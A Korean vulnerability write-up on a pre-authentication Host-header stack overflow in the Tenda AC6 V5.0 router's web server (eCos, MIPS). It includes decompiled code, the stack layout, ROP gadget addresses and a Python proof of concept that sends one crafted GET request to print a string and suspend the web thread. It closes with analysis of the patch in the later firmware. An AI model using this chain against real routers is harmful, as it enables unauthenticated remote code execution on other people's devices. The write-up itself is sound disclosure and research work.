Tearing Down eCos RTOS Embedded System Part 2

eCos RTOS 라우터 웹 서버의 인증 전 스택 오버플로우를 활용해 ROP 체인을 구성하고, 비인증 요청 한 번으로 임의 코드 실행에 이르는 과정.

TL;DR

Part 1에서는 eCos 스케줄러가 애플리케이션 스레드로 제어를 넘기는 지점까지 다뤘습니다. 이 중 HTTP 서버 역할을 맡은 스레드의 인증 전 스택 오버플로우 취약점을 이용해, 비인증 요청 한 번으로 임의 코드 실행에 이르는 과정을 다룹니다. 시연에서는 그 증거로 선택한 문자열을 UART에 출력하고 웹 관리 스레드를 정지시킵니다.
제품 Tenda AC6 V5.0
취약 버전 V02.03.01.110
최신 버전 V03.03.18.12

Background

Part 1의 부팅 흐름은 cyg_scheduler_start에서 끝나며, 실행 가능한 스레드 가운데 우선순위가 가장 높은 스레드가 먼저 실행됩니다. 이 공유기에서는 C++ 정적 생성자가 등록하는 스레드 중 하나가 GoAhead 계열 웹 서버를 띄우고 httpd_main 스레드로 동작합니다.

MIPS 기반 RTL8197F 칩셋에서 eCos RTOS가 돌아가는 이 타겟은 메모리 보호 기법이 사실상 없습니다.

  • MMU가 강제하는 페이지 권한이 없어 메모리가 사실상 RWX 상태로 열려 있습니다.
  • ASLR이 없어 스레드 스택을 포함한 주요 주소가 매 부팅마다 고정됩니다.
  • 스택 카나리가 없습니다.
  • 커널과 스레드, 버퍼가 단일 주소 공간을 함께 사용합니다.

The Attack Surface

웹 서버는 URL 핸들러를 체인으로 묶어 요청마다 순서대로 호출합니다. 맨 앞단의 인증 핸들러가 FUN_800c1814 로, GoAhead의 websSecurityHandler 에 대응합니다. 로그인 검증보다 먼저 실행되므로, 여기서 닿을 수 있는 경로는 모두 인증 전에 도달할 수 있습니다.

정적 파일, /favicon.ico, 일부 상태·정보 조회 엔드포인트를 빼면 GET / 같은 기본 요청도 그대로 이 경로를 탑니다.

Root Cause

HTTP 헤더 파서인 FUN_800bb2c4는 Host 헤더 값을 길이 제한 없이 strdup으로 복사해 둡니다.

// FUN_800bb2c4: header parser
iVar3 = strcmp(header_name, "host");
if (iVar3 == 0) {
    *(webs + 0x58) = strdup(value);   // uncapped copy of the attacker's Host value
}

이어서 보안 핸들러인 FUN_800c1814가 이 Host 값을 스택 버퍼로 옮길 때, 대상 버퍼 크기가 아니라 입력 문자열 길이(strlen)를 복사 길이로 넘깁니다.

// FUN_800c1814 — runs for every non-whitelisted URL, before auth
char auStack_58[40];                 // 40-byte destination at sp+0x580
...
uVar8 = *(webs + 0x58);              // attacker-controlled Host
uVar5 = strlen(uVar8);              // length of the SOURCE
strncpy(auStack_58, uVar8, uVar5); // @0x800c1c34  <-- overflow

strncpy(dst, src, strlen(src))는 사실상 strcpy와 다름없습니다. 긴 Host 값이 들어오면 40바이트 버퍼를 훌쩍 넘어 뒤쪽 스택 영역까지 그대로 덮어씁니다.

sp+0x580   auStack_58   0    <- Host field buf
sp+0x5b0   saved s0     48
sp+0x5b4   saved s1     52
sp+0x5b8   saved s2     56
sp+0x5bc   saved s3     60
sp+0x5c0   saved s4     64
sp+0x5c4   saved s5     68
sp+0x5c8   saved s6     72
sp+0x5cc   saved s7     76
sp+0x5d0   saved s8     80
sp+0x5d4   saved ra     84   ret addr

오프셋 84의 반환 주소와 오프셋 48~80의 s0..s8을 모두 덮어쓸 수 있습니다. 함수 에필로그가 jr ra 직전에 스택에 저장된 값으로 s 레지스터들을 복원하기 때문에, 반환 주소(ra)를 제어하는 동시에 다음 ROP 단계에서 쓸 s 레지스터 값도 함께 맞춰 넣을 수 있습니다.

제약 조건의 경우, Host 값이 strdup 과 strlen 을 거치므로 NUL(0x00) 바이트가 들어가면 문자열이 잘리고, 줄 단위 헤더 파싱 특성상 \r(0x0d)과 \n(0x0a)도 쓸 수 없습니다. 즉 페이로드에 0x00, 0x0d, 0x0a가 섞이면 안 됩니다.

Designing the Exploit

RTOS 환경이라 쉘이 없고, raw MIPS 쉘코드를 직접 꽂아 넣기도 어렵습니다. Host 헤더에 0x00, 0x0d, 0x0a를 넣을 수 없는데, MIPS는 32비트 고정 길이 명령어를 쓰기 때문에 $zero 레지스터(0번)를 참조하거나 작은 상수·오프셋을 인코딩할 때 기계어에 0x00 바이트가 자주 나옵니다. 결국 쉘코드 주입 대신 펌웨어 안의 기존 가젯을 엮는 ROP로 방향을 잡아야 합니다.

핵심 프리미티브는 두 가지입니다.

첫째는 0x800915b4에 있는 호출 가젯입니다.

jalr   $s1
move   $a0, $s2        ; delay slot: a0 = s2
move   $v0, 0
lw     $ra, 0x24($sp)
lw     $s2, 0x20($sp)
lw     $s1, 0x1c($sp)
lw     $s0, 0x18($sp)
jr     $ra
addiu  $sp, $sp, 0x28

$s2를 $a0에 넣고 $s1이 가리키는 함수를 호출한 뒤, 스택에서 $s0, $s1, $s2, $ra를 다시 불러와 반환합니다. 호출이 끝날 때마다 다음 s1, s2, ra를 스택에서 꺼내므로, 스택에 (함수, 인자) 쌍을 이어 붙이면 단일 인자 함수를 연속으로 호출할 수 있습니다.

둘째는 “출력” 프리미티브입니다. 쉘은 없지만 펌웨어 내장 CLI 함수 FUN_800379f4(fd) 아래에 UART 출력 함수 diag_write_string이 0x8021de74에 있습니다.

// FUN_8021de74 — diag_write_string(char *s)
void diag_write_string(char *s) {
    while (*s != '\0')
        diag_write_char(*s++);   // FUN_8021de2c, one byte to the UART
}

NUL 종료 문자열 포인터 하나를 인자로 받으므로 호출 가젯과 궁합이 맞습니다. ASLR이 없어 스택에 올라간 Host 페이로드 주소를 그대로 쓸 수 있으니, s1에 diag_write_string, s2에 페이로드 끝 문자열 주소를 넣어 원하는 문자열을 UART로 찍을 수 있습니다.

출력 뒤 마무리도 중요합니다. 체인이 잘못된 주소로 흘러 스레드가 죽게 두면 웹 서버가 몇 초 뒤 스레드를 다시 살리지만, UART에 크래시 로그가 남습니다. 그 대신 httpd_main의 정적 Cyg_Thread 객체(0x805ccc50)를 인자로 cyg_thread_suspend(0x8021efb8)를 호출하면 타이머나 알람을 건드리지 않고 스레드만 스케줄링에서 뺍니다. 덕분에 UART에는 임의 문자열만 남고 나머지 시스템은 크래시나 리부트 없이 그대로 돌아갑니다.

Proof-of-Concept

인증 없는 HTTP 요청 한 번으로 Host 헤더에 2단 ROP 체인을 실어 임의 문자열을 출력하고, 웹 서버 스레드를 멈춰 시스템을 유지합니다.

WRITES    = 0x8021de74   # diag_write_string(a0)
PGAD      = 0x800915b4   # clean call gadget: jalr s1 ; a0 = s2 ; reload ; return
SUSPEND   = 0x8021efb8   # cyg_thread_suspend(thread)
HTTPD_TCB = 0x805ccc50   # httpd_main's static Cyg_Thread object
MARKER    = 0x805d4b60   # where the marker lands on the stack (no ASLR)

p  = b"A"*48 + b"A"*4 + le(WRITES) + le(MARKER) + b"A"*24 + le(PGAD)   # stage 1: print
p += b"A"*24 + b"A"*4 + le(SUSPEND) + le(HTTPD_TCB) + le(PGAD)         # stage 2: suspend

ART = [
 "                              _   _",
 " _ ____      ___ __   ___  __| | | |__  _   _",
 "| '_ \\ \\ /\\ / / '_ \\ / _ \\/ _` | | '_ \\| | | |",
 "| |_) \\ V  V /| | | |  __/ (_| | | |_) | |_| |",
 "| .__/ \\_/\\_/ |_| |_|\\___|\\__,_| |_.__/ \\__, |",
 "|_|                                     |___/",
 "",
 " _ __________     _            _           _",
 "| |___ /___ /  __| | __ _  ___| |_ ___  __| |",
 "| | |_ \\ |_ \\ / _` |/ _` |/ __| __/ _ \\/ _` |",
 "| |___) |__) | (_| | (_| | (__| ||  __/ (_| |",
 "|_|____/____/ \\__,_|\\__,_|\\___|\\__\\___|\\__,_|",
]
p += "#".join(ART).encode() + b"\x00"

에필로그가 s1, s2, ra를 복원한 뒤 호출 가젯이 실행되면 diag_write_string(&marker)가 돌고, 이어서 다음 (함수, 인자) 쌍을 읽어 cyg_thread_suspend로 웹 서버 스레드를 정지시킵니다.

s = socket.create_connection((TARGET, 80), timeout=5)
s.sendall(b"GET / HTTP/1.1\r\nHost: " + p + b"\r\nConnection: close\r\n\r\n")

인증 없이 GET / 요청 한 번에 긴 Host 헤더를 실어 보내면 됩니다.

Demonstration

인증 없이 보낸 요청 한 번으로 웹 서버의 제어 흐름을 바꿔, 펌웨어 함수를 호출하고 지정한 문자열을 UART 콘솔에 출력했습니다. 이 시연은 인증 전 원격 코드 실행을 기존 펌웨어 함수 호출로 입증합니다. 이후 웹 서버 스레드가 정지해 재부팅 전까지 관리 UI에 접속할 수 없었습니다. 시연 중 장치가 크래시하거나 재부팅되지는 않았습니다.

Conclusion

인증 없는 GET / 요청 하나로 인증 전 핸들러를 거쳐 40바이트 스택 버퍼를 넘기고, 덮어쓴 레지스터와 반환 주소로 펌웨어 내부 ROP 체인을 실행합니다. 이 체인이 실행된 것 자체가 임의 코드 실행입니다. 공격자가 고른 펌웨어 함수를 고른 인자로 호출하고, 가젯으로 메모리까지 직접 씁니다. 시연에서 눈에 보이는 결과인 선택한 문자열의 UART 출력과 웹 관리 스레드 정지는, 장비를 망가뜨리지 않고 그 실행을 증명하려고 고른 비파괴적 예시입니다. ASLR, NX, 스택 카나리가 없는 환경에서는 제어된 반환 주소 하나면 충분합니다.

V03.03.18.12 버전의 바이너리를 정적 분석한 결과, 보안 핸들러가 Tenda_webs_Login_Handler(FUN_800eb178)로 다시 작성된 것을 확인했습니다. Host는 webs+0x15c로 옮겨졌고, Root Cause의 무제한 strncpy가 크기를 제한하는 strlcpy로 패치 되었습니다.

// V03.03.18.12, Tenda_webs_Login_Handler (FUN_800eb178), 인증 전
if (*(webs + 0x15c) == 0) {                  // Host가 비었거나 없음
    websError(webs, 0x20190, "Bad host header");
    return 1;                                // 복사 이전에 요청 거부
}
...
// FUN_8006f244 == strlcpy(dst, src, n): 최대 n-1 바이트 복사 후 항상 NUL 종료
strlcpy(auStack_ac /* 64바이트 */, *(webs + 0x15c) /* Host */, 0x40);

0x40 상한으로 64바이트 버퍼에 복사하므로 Host 길이와 무관하게 오버플로우가 나지 않습니다. 다만 이는 정적 분석으로 코드 변경을 확인한 것이며, 실기기에서 익스플로잇이 차단되는지는 별도로 검증하지 않았습니다.

릴리스 노트에도 이 수정은 명시되어 있지 않습니다.
